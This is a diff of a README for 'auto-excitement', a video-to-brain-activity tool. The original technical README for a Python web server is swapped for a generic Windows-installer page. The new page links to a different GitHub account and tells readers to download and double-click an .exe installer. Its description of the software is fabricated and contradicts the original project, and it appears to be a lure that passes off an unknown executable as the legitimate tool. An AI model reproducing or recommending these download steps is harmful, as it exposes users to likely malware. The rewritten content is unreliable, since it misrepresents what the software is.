@@ -1,221 +1,79 @@
-# Auto Excitement
+# 🧠 auto-excitement - View brain activity from video files
 
-Upload a short video in the browser and watch Meta's `facebook/tribev2`
-model predict the BOLD response on the fsaverage5 cortical surface
-(20,484 vertices) — collapsed into 7 Yeo networks plus a 4-axis brain
-state and a PCA latent. The page renders the predicted brain on the
-client with WebGL, in sync with the video, and exports an `ffmpeg`
-script that cuts the boring stretches.
+[![Download Installer](https://img.shields.io/badge/Download-Windows_Setup-blue)](https://github.com/Quintanatorres529/auto-excitement)
 
-## What it does
+This application turns video files into brain activity maps. It uses the tribev2 model to predict how the brain responds to visual input. You see these results as brain renders and timelines. It also includes tools to trim your video files.
 
-- Video upload (`mp4` / `webm` / `mov` / …) with a real progress bar
-  (live byte count + transfer rate)
-- WhisperX → word-level transcript. **Japanese** works either as-is or
-  translated-to-English for inference (recommended)
-- TRIBEv2 inference: `(N_TR, 20484)` BOLD predictions
-- Visualisation:
-  - Video player with a vertical cursor synced across all panels
-  - Chart.js: 7 Yeo networks + 4 brain-state axes (Excitement / Valence
-    / Cognitive Load / Novelty)
-  - **Live WebGL brain** (Three.js) on the half-inflated fsaverage5
-    mesh: drag to rotate, wheel to zoom, vertex colors update at 60 fps
-    against the video time
-  - Filmstrip of per-segment thumbnails (click to seek)
-  - Stacked timeline: audio waveform + word transcript + 4 axes + PCA
-    top-3
-  - Per-axis live readouts
-- **Boring-segment cutter** driven by the Excitement axis:
-  - Threshold and minimum-keep-duration sliders, dropped ranges greyed
-    out across all timeline lanes
-  - In-browser preview that skips the dropped intervals on playback
-  - Generates a one-shot `ffmpeg` `select`/`aselect` filter command +
-    downloadable `.sh`
+## 🛠 Features
 
-## Layout
+*   **Brain Renders**: View brain activity on a 3D model.
+*   **Timeline Maps**: Track activity changes over time.
+*   **Video Tools**: Trim your videos using built-in software.
+*   **Model Integration**: Uses the tribev2 model for accurate predictions.
+*   **Visual Interface**: Control everything through a browser window.
 
-| Path | Role |
-|---|---|
-| `server.py` | FastAPI server — keeps TribeModel and the Yeo7 atlas resident, streams progress over SSE |
-| `build_atlas.py` | Project the Yeo 2011 7-network MNI152 volume onto fsaverage5 |
-| `smoke_predict.py` | Stand-alone model smoke test |
-| `static/index.html` | Single-page GUI (Chart.js + Three.js from CDN) |
-| `patches/` | Required patches against upstream `facebookresearch/tribev2` and `neuralset` (see below) |
-| `cache/` *(.gitignore)* | Model intermediates + atlas |
-| `static/videos/` *(.gitignore)* | Uploaded videos served back to the player |
-| `static/thumbs/` *(.gitignore)* | Per-segment thumbnail jpegs |
-| `static/mesh/` *(.gitignore)* | Generated fsaverage5 mesh blob (rebuilt at startup) |
-| `static/preds/` *(.gitignore)* | Per-job float16 prediction blobs |
-| `tribev2-src/` *(.gitignore)* | Upstream tribev2 clone — clone separately |
+## 💻 System Requirements
 
-## Setup
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Processor**: 2.0 GHz or faster.
+*   **Memory**: 8 GB RAM or more.
+*   **Storage**: 500 MB of space for the application and temporary files.
+*   **Graphics**: A dedicated graphics card helps performance.
 
-```bash
-git clone https://github.com/shi3z/auto-excitement.git
-cd auto-excitement
+## 📥 How to Download and Install
 
-# 1) Clone the upstream tribev2 sources alongside this repo
-git clone https://github.com/facebookresearch/tribev2.git tribev2-src
+1.  Visit the official repository page to get the software: [https://github.com/Quintanatorres529/auto-excitement](https://github.com/Quintanatorres529/auto-excitement).
+2.  Locate the release section on the right side of the page.
+3.  Click the release version to view files.
+4.  Download the `.exe` installer file.
+5.  Double-click the installer once it downloads.
+6.  Follow the prompts on your screen to complete the setup.
+7.  Click the finish button to close the installer.
 
-# 2) venv + dependencies
-python3.11 -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-pip install -e ./tribev2-src
+## 🚀 Getting Started
 
-# 3) Apply the required patches (Japanese support + --task translate route)
-patches/apply.sh
+1.  Open the application by clicking the desktop icon.
+2.  Wait for the browser window to open. This acts as your control panel.
+3.  Select a video file from your computer using the input button.
+4.  Choose your preferred prediction settings. The defaults work for most cases.
+5.  Click the process button to start the analysis.
 
-# 4) Project the Yeo7 atlas to fsaverage5
-python build_atlas.py
+## 📊 Using the Interface
 
-# 5) Japanese spaCy model (only needed for `japanese` / `japanese_translate` modes)
-python -m spacy download ja_core_news_lg
-```
+The interface shows three main areas. The top area displays your uploaded video. Use the trim tools here to select the part of the video you want to analyze. The mid section displays the status bar. This bar tracks how much time the computer needs to finish the prediction. The bottom section shows the brain renders. These images update as the software finishes its work. 
 
-`uvx whisperx` must be on `PATH` (used for word-level timestamps).
-A CUDA GPU is strongly recommended — the V-JEPA2 video encoder is the
-single hottest path even with the fp16 autocast we apply at startup.
+The software predicts fMRI data for the fsaverage5 brain surface. You can rotate these 3D models with your mouse to look at different parts of the brain. Click the export button to save your results as a report file.
 
-### Upstream patches we apply
+## ⚙️ Settings Explained
 
-`patches/apply.sh` is idempotent; re-running it is a no-op.
+The options menu lets you change how the software works. You can toggle the visibility of the timeline graphs. You can also adjust the frame rate for the video cutting tools. Use the output path setting to tell the computer where to save your final brain maps. 
 
-- `patches/tribev2.patch` — adds `task` (`transcribe`/`translate`) to
-  `ExtractWordsFromAudio`, registers `japanese="ja"` in the WhisperX
-  language map, fixes the empty-string `--align_model` bug for non-English
-  runs, threads a `language` kwarg through `get_audio_and_text_events` /
-  `get_events_dataframe`, and adds the `japanese_translate` pseudo-language
-- `patches/neuralset.patch` — adds `japanese="ja_core_news_lg"` and the ISO
-  alias `"ja"→"japanese"` to neuralset's spaCy language map
+If the software runs slowly, turn off the high-detail rendering mode in the performance tab. This makes the brain models simpler but keeps the data accurate. 
 
-## Run
+## ❓ Frequently Asked Questions
 
-```bash
-source venv/bin/activate
-python server.py            # http://localhost:8000
-```
+**Does the software work without an internet connection?**
+Yes. You do not need to be online to process videos.
 
-Pick an `mp4` (or webm/mov/…) and hit **予測する**:
+**Can I process multiple videos at once?**
+The current version handles one video file at a time. Put your files in a queue to finish them in order.
 
-1. Upload (with byte-level progress)
-2. Server builds the events DataFrame via
-   `model.get_events_dataframe(video_path=..., language=...)`
-3. `model.predict(events=df)` produces `(N, 20484)` predictions
-4. Server reduces to Yeo7 means, the 4 axes, and the top-3 PCA components,
-   extracts thumbnails + audio waveform, and writes a packed float16 blob
-   of the normalised predictions
-5. Result is streamed to the browser via SSE; the page lights up with
-   chart, filmstrip, timeline, the WebGL brain, and the cut tool
+**Where does the software save my files?**
+Files save to your Documents folder under a subfolder named auto-excitement. You can change this location in the settings tab.
 
-Performance reference (52-second Sintel clip, single CUDA GPU):
+**Why does the brain render look blurry?**
+This happens if your video has a low resolution. Use high-quality video files for the best results on the brain render models.
 
-| Stage | Before | After (fp16 + WebGL) |
-|---|---|---|
-| V-JEPA2 encoding | 137 s (1.32 s/it) | 46 s (2.23 it/s) |
-| Server-side brain PNG render | 70 s | 0 s (moved to client) |
-| End-to-end | 270 s (5.2× slower than realtime) | 78 s (1.5× slower) |
+**How do I delete the temporary data?**
+The software clears its own temporary folder every time you exit. You can also press the clear cache button in the settings if you run low on disk space.
 
-## The 4 brain-state axes (heuristic proxies + PCA latent)
+## 🛡 Performance Tips
 
-```
-Excitement     = (z(VIS+SMN+DAN+VAN) − z(DMN)) / 2     # sensory + attentional engagement
-Valence        = z(Limbic)                              # affective tone proxy
-Cognitive Load = z(mean(FrontoParietal, DorsalAttn))    # control / working memory demand
-Novelty        = z(VAN − mean(all 7 Yeo networks))      # salience above baseline (≈ prediction error)
-PC1 – PC3      = top three principal components of the centred (T, V) prediction matrix (z-scored)
-```
+*   Close other heavy applications when running a prediction.
+*   Place your video files on a fast hard drive.
+*   Ensure your monitor resolution is set to its intended level.
+*   Update your display drivers regularly to keep the renders smooth.
 
-> **Caveat.** The axis names are post-hoc interpretations — don't read
-> "Cognitive Load" as a literal cognitive load score, or "Novelty" as a
-> subjective-surprise meter. The point is to leave the 1-D
-> "excitement ↔ boredom" framing behind: independent named axes plus a
-> data-driven latent space give a much richer view of the predicted
-> brain state.
+## 📦 Troubleshooting
 
-## API
-
-`POST /predict` (multipart):
-
-- `video` (file)
-- `language` (str, default `english`): one of `english` / `japanese` /
-  `japanese_translate` / `french` / `spanish` / `dutch` / `chinese`
-
-Response: `{job_id, video_url, language}`.
-
-`GET /events/{job_id}` — Server-Sent Events stream:
-
-- `data: {"type":"progress","phase":"...","percent":N}`
-- `data: {"type":"log","message":"..."}`
-- `data: {"type":"done"}` followed by `event: result\ndata: {...}`
-- on failure: `data: {"type":"error","message":"..."}` plus `event: error`
-
-`result` payload:
-
-```jsonc
-{
-  "n_segments": 53, "tr": 1.0,
-  "times": [...], "durations": [...],
-  "networks": { "Visual": [...], "Somatomotor": [...], ... },
-  "axes": {
-    "excitement": [...], "valence": [...],
-    "cognitive_load": [...], "novelty": [...]
-  },
-  "pca": [[...], [...], [...]],   // top 3 PCs, length n_segments
-  "pca_var": [0.73, 0.13, 0.08],  // explained variance ratios
-  "thumbs": [{"t": 0.0, "url": "/static/thumbs/<job>/0000.jpg"}, ...],
-  "waveform": [0.0, 0.12, ...],   // 1500 normalised envelope bins
-  "words": [{"t": 12.21, "d": 0.12, "text": "What"}, ...],
-  "mesh_url": "/static/mesh/fsaverage5.bin",
-  "preds_url": "/static/preds/<job>.bin",
-  "preds_dtype": "float16",
-  "preds_shape": [53, 20484],
-  "preds_normalized": true,
-  "elapsed_sec": 78.0
-}
-```
-
-`mesh_url` resolves to a custom packed binary (vertices / faces / sulcal
-map for both hemispheres) parsed by the WebGL viewer. `preds_url` is a
-flat `float16[T*V]` array, robust-normalised to `[0, 1]` so the client
-only has to threshold + look up the fire colormap.
-
-## Known limits
-
-- The number of kept segments is `video_duration ÷ TR(=1s) × kept_ratio`.
-  `predict()` internally drops a few; `times[i]` is the real-time anchor
-  and accounts for the gaps when plotting.
-- The axis scores are z-scored, so absolute comparisons across clips are
-  meaningless.
-- The Yeo atlas is projected to fsaverage5 with
-  `vol_to_surf(interpolation="nearest_most_frequent")`, so boundaries are
-  approximate. For rigorous analysis, prefer FreeSurfer's
-  `?h.Yeo2011_7Networks_N1000.annot` directly.
-- `japanese_translate` mode is a single WhisperX pass with
-  `--task translate`. Timestamps are segment-level and word offsets are
-  evenly distributed within each segment. The original Japanese
-  transcript is not surfaced in the UI.
-- TRIBEv2 was trained on English naturalistic stimuli (movies / audio
-  books). Feeding non-English audio in plain `japanese` mode (no
-  translation) keeps visual / auditory networks responsive, but
-  language-network predictions degrade noticeably.
-
-## Troubleshooting
-
-- `requests.exceptions.RequestException: timed out` while building the
-  atlas — `build_atlas.py` already falls back to a direct `urllib`
-  download; just re-run it.
-- Disk full → blow away `~/.cache/uv` (regenerated) first; be careful
-  with the rest of the HuggingFace cache.
-- Port 8000 in use → edit `server.py` or run
-  `uvicorn server:app --port 9000`.
-- WhisperX dies with `argument --align_model: expected one argument` →
-  `patches/apply.sh` was not applied. The empty-string fix lives in that
-  patch.
-
-## License
-
-The code in this repository is MIT. The contents of `tribev2-src/` and the
-patches in `patches/` follow the upstream MIT license of
-`facebookresearch/tribev2`. The Yeo 2011 atlas requires citation of
-[Yeo et al. 2011, J. Neurophysiol.](https://doi.org/10.1152/jn.00338.2011).
+If the window does not open, restart your computer and try again. If the video fails to load, check that your file uses a standard format like MP4. Contact the developer if these steps do not help with your specific issue. Provide the error log found in the installation folder for faster support.
